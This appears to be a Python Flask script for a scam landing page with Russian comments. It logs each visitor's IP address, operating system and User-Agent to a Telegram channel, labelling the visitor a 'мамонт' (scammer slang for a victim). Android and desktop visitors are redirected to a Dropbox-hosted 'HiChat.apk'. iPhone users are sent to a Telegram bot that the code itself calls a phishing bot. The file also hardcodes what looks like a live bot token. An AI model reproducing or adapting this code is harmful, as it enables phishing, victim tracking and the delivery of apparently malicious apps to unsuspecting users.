from flask import Flask, request, redirect
import telebot

app = Flask(__name__)

# Инициализация бота
bot_token = '7836843340:AAHBgzaZC_jhdppGtLe5wbfSOl46aw5lP88'  # Замените на ваш токен бота
bot = telebot.TeleBot(bot_token)
channel_id = '-1002321626192'  # Замените на ID вашего закрытого канала

def get_os_info(user_agent):
    """Определение операционной системы по User-Agent."""
    if "android" in user_agent.lower():
        return "Android"
    elif "iphone" in user_agent.lower() or "ipad" in user_agent.lower():
        return "iOS"
    elif "windows" in user_agent.lower():
        return "Windows"
    elif "macintosh" in user_agent.lower():
        return "macOS"
    else:
        return "Неизвестная ОС"

def get_real_ip():
    """Получение реального IP-адреса клиента."""
    if request.headers.get('X-Forwarded-For'):
        return request.headers['X-Forwarded-For'].split(',')[0]  # Первый IP — это реальный IP пользователя
    else:
        return request.remote_addr

@app.route('/')
def index():
    user_ip = get_real_ip()
    user_agent = request.headers.get('User-Agent', 'Неизвестный User-Agent')  # Обработка случая отсутствия User-Agent
    os_info = get_os_info(user_agent)

    # Формирование сообщения
    message = f"🦣 Мамонт нажал 'Установить':\n\n🔗 IP: {user_ip}\n⚙ ОС: {os_info}\n\n💻 User-Agent: {user_agent}"

    # Если пользователь с iPhone, добавляем информацию о перенаправлении
    if os_info == "iOS":
        message += "\n\n📲 Пользователь был перенаправлен на фишинг бота"

    # Отправка сообщения в Telegram канал
    try:
        bot.send_message(channel_id, message)
    except Exception as e:
        print(f"Ошибка отправки сообщения в Telegram: {e}")

    # Перенаправление на нужную ссылку в зависимости от ОС
    if os_info == "Android":
        return redirect("https://www.dropbox.com/scl/fi/hrax66tdbgihla29oe0n0/HiChat.apk?rlkey=o9n0wqzvkj7e6ebdsjtj64iig&st=2nif7ge9&dl=1", code=302)  # Ссылка для Android
    elif os_info == "iOS":
        return redirect("https://t.me/VidChatRobot", code=302)  # Ссылка для iOS
    else:
        return redirect("https://www.dropbox.com/scl/fi/hrax66tdbgihla29oe0n0/HiChat.apk?rlkey=o9n0wqzvkj7e6ebdsjtj64iig&st=2nif7ge9&dl=1", code=302)  # Ссылка по умолчанию для других ОС

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)  # Убедитесь, что сервер доступен извне